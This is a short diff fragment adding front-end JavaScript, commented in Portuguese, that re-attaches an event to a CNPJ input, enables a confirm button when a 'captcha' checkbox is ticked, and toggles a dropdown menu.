+// Caso o campo seja recriado dinamicamente, garantimos que o evento seja reaplicado                      
+document.addEventListener("click", function(event) {                      
+    if (event.target.id === "cnpjInput") {                      
+        attachCNPJEvent();                      
+    }                      
+});                     
+        
+ // Ao marcar o Captcha, habilita o botão com efeito        
+document.addEventListener("change", function (e) {  
+  if (e.target && e.target.id === "confirmacaoCnpj") {  
+    const confirmButton = document.getElementById("confirmButton");  
+  
+    if (!confirmButton) return;  
+  
+    if (e.target.checked) {  
+      // Captcha marcado: habilita o botão  
+      confirmButton.disabled = false;  
+      confirmButton.classList.remove("disabled-pending");  
+      confirmButton.classList.add("activated");  
+  
+      setTimeout(() => {  
+        confirmButton.classList.remove("activated");  
+      }, 800);  
+    } else {  
+      // Captcha desmarcado: desabilita o botão  
+      confirmButton.disabled = true;  
+      confirmButton.classList.add("disabled-pending");  
+    }  
+  }  
+});       
+</script>  
+  
+<script>  
+function toggleMenu() {  
+    const menu = document.getElementById("menuDropdown");  
+    menu.style.display = (menu.style.display === "block") ? "none" : "block";  
+}  
+  
+document.addEventListener("click", function(event) {  
+    const menu = document.getElementById("menuDropdown");  
+    const icon = document.querySelector(".menu-icon");  
+    if (menu && !menu.contains(event.target) && event.target !== icon) {  
+        menu.style.display = "none";  
+    }  
+});  
+</script>
